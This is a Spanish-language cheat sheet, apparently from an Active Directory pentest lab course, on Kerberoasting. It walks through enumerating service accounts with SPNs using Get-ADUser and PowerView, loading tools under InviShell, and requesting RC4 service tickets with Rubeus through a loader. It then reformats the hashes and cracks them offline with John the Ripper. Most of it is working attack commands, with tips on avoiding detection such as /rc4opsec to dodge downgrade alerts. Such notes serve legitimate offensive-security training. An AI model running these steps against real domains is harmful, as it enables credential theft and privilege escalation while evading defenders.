# PrivEsc Kerberoasting 

Tags: #AD #kerberoasting 

```bash 
- Crackeo offline de contraseñas de cuentas de servicio.
- El ticket de sesión de Kerberos ('TGS') contiene una porción destinada al servidor que está cifrada con el hash de la contraseña de la cuenta de servicio.  
    Esto permite solicitar un ticket y realizar un 'ataque de contraseñas offline'.
- Debido a que las contraseñas de cuentas de servicio (que no son de máquina) 'no se cambian con frecuencia', este se ha convertido en un ataque muy popular.
```

```bash 
## Regla de oro (Kerberoasting)

- RC4 (rc4_hmac / etype 23)                   →   🔴 Fácil de crackear
- AES128 (aes128_cts_hmac_sha1 / etype 17)    →   🟡 Mucho más difícil
- AES256 (aes256_cts_hmac_sha1 / etype 18)    →   🟡 Mucho más difícil
```

## ActiveDirectory Module 

```powershell 
! Usuario: Usuario de dominio

❯ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
# Enumerar cuentas de usuario con SPNs registrados, identifica cuentas de servicio candidatas para Kerberoasting.
```

## Powerview

```powershell 
! Usuario: Usuario de dominio con bajos privilegios 

Paso 1:
❯ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

❯ . .\PowerView.ps1      # Importar el módulo 

Paso 2:
❯ Get-DomainUser -SPN
# Enumerar cuentas de usuario con SPNs registrados, identifica cuentas de servicio candidatas para Kerberoasting


	# Obtener lo siguiente: 
	displayname              : svc admin 
	serviceprincipalname     : {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
```

## Rubeus 

Ten en cuenta que estamos usando la opción `/rc4opsec`, la cual obtiene hashes únicamente de cuentas que soportan RC4. Esto significa que si la opción "This account supports Kerberos AES 128/256 bit encryption" está habilitada para una cuenta de servicio, el siguiente comando no solicitará sus hashes.

```powershell 
! Usuario: Usuario de dominio 
# Ejecutar desde un CMD como administrador local si no funciona con PS

Paso 3:
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
# Solicitar un TGS para el SPN asociado a la cuenta svcadmin mediante Kerberoasting, extraer el hash RC4-HMAC del ticket de servicio y guardarlo en hashes.txt para su posterior crackeo offline.

❯ Rubeus.exe kerberoast /stats
❯ .\Loader.exe -path C:\AD\Rubeus.exe -args kerberoast /stats
# Listar estadísticas de cuentas Kerberoasteables en el dominio — muestra cantidad de cuentas y tipos de cifrado soportados.

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args kerberoast 
# Solicitar un TGS para una cuenta de servicio (No recomendable ya solicita todos los tickets de servicio y es muy detectable)

❯ Rubeus.exe kerberoast /user:svcadmin /simple  # Manera correcta de solicitar un TGS 
# Solicitar un TGS para una cuenta de servicio específica y mostrar el hash en formato simple listo para crackear.

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args klist 
# Listar los tickets Kerberos activos en la sesión actual cargando Rubeus en memoria vía Loader.exe

❯ Rubeus.exe kerberoast /stats /rc4opsec
# Listar solo cuentas Kerberoasteables que soportan únicamente RC4_HMAC — evita detecciones por downgrade de cifrado (EType 0x17).

❯ Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
# Solicitar TGS de una cuenta específica forzando RC4_HMAC — más sigiloso al evitar downgrade detectable.

❯ Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
# Kerberoastear todas las cuentas posibles usando RC4_HMAC y guardar los hashes en un archivo para crackear offline.
```

## Cracking del hash obtenido 

Si Rubeus obtiene el hash de la primer manera:
* `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*`

Se debe de modificar a la segunda manera dentro de hashes.tx para el crackeo con John:
* `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*` 

```powershell 
! Usuario: Usuario local
# Ejecutar desde una consola CMD

Paso 4:
❯ C:\AD\Tools\Sliver\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt hashes.txt
# Crackear los hashes Kerberoasteados offline usando John the Ripper con un wordlist — recupera la contraseña en texto claro de la cuenta de servicio.

❯ C:\AD\Tools\Sliver\john-1.9.0-jumbo-1-win64\run\john.exe --show hashes.txt
# Mirar la contraseña del hash 
```

```bash 
# Utilizar las siguientes herramientas para generar diccionarios customizados
- Crunch 
- CeWL
- Bopscrk
```